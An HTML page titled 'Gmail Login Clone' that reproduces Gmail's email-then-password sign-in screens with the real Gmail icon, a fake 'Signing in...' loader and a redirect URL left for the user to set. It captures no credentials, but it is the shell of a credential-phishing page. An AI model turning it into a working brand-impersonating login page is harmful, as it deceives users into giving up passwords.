<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Login Clone</title>
    <style>
        /* Google Font */
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #121212;
        }

        .login-container {
            background: #1E1E1E;
            padding: 40px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }

        .logo {
            width: 60px;
            margin-bottom: 10px;
        }

        h2 {
            color: #fff;
            font-size: 22px;
            margin-bottom: 5px;
        }

        p {
            color: #bbb;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .input-box {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #555;
            background: #2C2C2C;
            color: #fff;
            border-radius: 5px;
            outline: none;
        }

        .forgot {
            color: #1A73E8;
            font-size: 14px;
            display: block;
            margin-bottom: 20px;
            text-decoration: none;
        }

        .btn {
            width: 100%;
            padding: 10px;
            background: #1A73E8;
            color: #fff;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn:hover {
            background: #135ABE;
        }

        .create-account {
            margin-top: 20px;
            color: #bbb;
            font-size: 14px;
        }

        .create-account a {
            color: #1A73E8;
            text-decoration: none;
        }

        .hidden {
            display: none;
        }

        .checkbox {
            display: flex;
            align-items: center;
            justify-content: start;
            color: #bbb;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .checkbox input {
            margin-right: 8px;
        }

        /* Loading Screen */
        .loading-page {
            background: #1E1E1E;
            padding: 40px;
            border-radius: 10px;
            width: 350px;
            text-align: center;
            color: white;
        }

        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1A73E8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- First Page: Email Entry -->
    <div class="login-container" id="email-page">
        <img class="logo" src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" alt="Gmail Logo">
        <h2>Sign in</h2>
        <p>to continue to Gmail</p>
        
        <input type="text" class="input-box" id="email-input" placeholder="Email or phone">
        
        <a href="#" class="forgot">Forgot email?</a>
        
        <button class="btn" onclick="validateEmail()">Next</button>
        
        <p class="create-account">Not your computer? Use Guest mode to sign in privately. 
            <a href="#">Learn more</a>
        </p>
        
        <p class="create-account">
            <a href="#">Create account</a>
        </p>
    </div>

    <!-- Second Page: Password Entry -->
    <div class="login-container hidden" id="password-page">
        <img class="logo" src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/gmail.ico" alt="Gmail Logo">
        <h2>Welcome</h2>
        
        <input type="password" class="input-box" id="password-input" placeholder="Enter your password">
        
        <div class="checkbox">
            <input type="checkbox" id="show-password" onclick="togglePassword()"> 
            <label for="show-password">Show password</label>
        </div>
        
        <a href="#" class="forgot">Try another way</a>
        
        <button class="btn" onclick="showLoadingScreen()">Next</button>
    </div>

    <!-- Loading Page -->
    <div class="login-container hidden" id="loading-page">
        <h2>Signing in...</h2>
        <div class="loader"></div>
    </div>

    <script>
        function validateEmail() {
            let emailInput = document.getElementById("email-input").value.trim();

            if (emailInput === "") {
                alert("Please enter your email or phone number.");
                return;
            }

            // If input is valid, proceed to password page
            goToPasswordPage();
        }

        function goToPasswordPage() {
            document.getElementById("email-page").classList.add("hidden");
            document.getElementById("password-page").classList.remove("hidden");
        }

        function togglePassword() {
            let passwordInput = document.getElementById("password-input");
            passwordInput.type = passwordInput.type === "password" ? "text" : "password";
        }

        function showLoadingScreen() {
            document.getElementById("password-page").classList.add("hidden");
            document.getElementById("loading-page").classList.remove("hidden");

            // Simulate authentication delay (2 seconds)
            setTimeout(() => {
                window.location.href = "#"; // Change "#" to your desired redirect URL
            }, 2000);
        }
    </script>

</body>
</html>
